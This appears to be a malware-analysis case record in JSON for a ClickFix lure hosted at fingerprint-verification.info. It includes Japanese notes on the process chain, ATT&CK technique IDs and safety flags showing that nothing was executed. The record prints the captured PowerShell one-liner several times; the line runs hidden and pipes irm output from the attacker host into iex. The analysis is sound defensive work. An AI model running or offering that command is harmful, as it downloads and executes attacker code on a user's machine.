@@ -1,0 +1,88 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt1",
+  "analysis_date": "2026-08-25",
+  "domain": "fingerprint-verification.info",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt1"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "powershell -w h \"iex(irm 'fingerprint-verification.info/b65e021a394660c5'); Start-Sleep -Seconds 24\"; exit;",
+    "sha256": "ad205fd0791c387ae175527f61eeafd7f56ef6458cfbfa14cb790135136d52f5",
+    "length": 107,
+    "duplicate_count": 1,
+    "pattern": "Invoke-RestMethod + Invoke-Expression",
+    "deobfuscated": null,
+    "stage_locator_raw": "fingerprint-verification.info/b65e021a394660c5",
+    "stage_url_normalized": "https://fingerprint-verification.info/b65e021a394660c5",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "powershell -w h \"iex(irm 'fingerprint-verification.info/b65e021a394660c5'); Start-Sleep -Seconds 24\"; exit;",
+    "command_line_normalized": "powershell -w h \"iex(irm 'fingerprint-verification.info/b65e021a394660c5'); Start-Sleep -Seconds 24\"; exit;",
+    "command_line_length": 107,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "ad205fd0791c387ae175527f61eeafd7f56ef6458cfbfa14cb790135136d52f5"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": "利用者起点（Run dialogまたは既存shell） → powershell.exe → 同一powershell.exe内でHTTP応答をIEX評価",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "-w hはWindowStyle Hiddenを指定し、PowerShell画面を隠す。",
+      "irmで取得した応答をiexへ直接渡し、ディスク保存なしで同一process内に評価する。",
+      "評価が戻った後に24秒待機し、末尾のexitで呼出し元shell終了を試みる。",
+      "取得文字列はschemeを省略しているため、実行環境のURI解釈によっては取得前に失敗し得る。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://fingerprint-verification.info/b65e021a394660c5",
+    "status": "http_404",
+    "http_status": 404,
+    "bytes": 146,
+    "body_sha256": "55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0",
+    "body_type": "html",
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1105"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
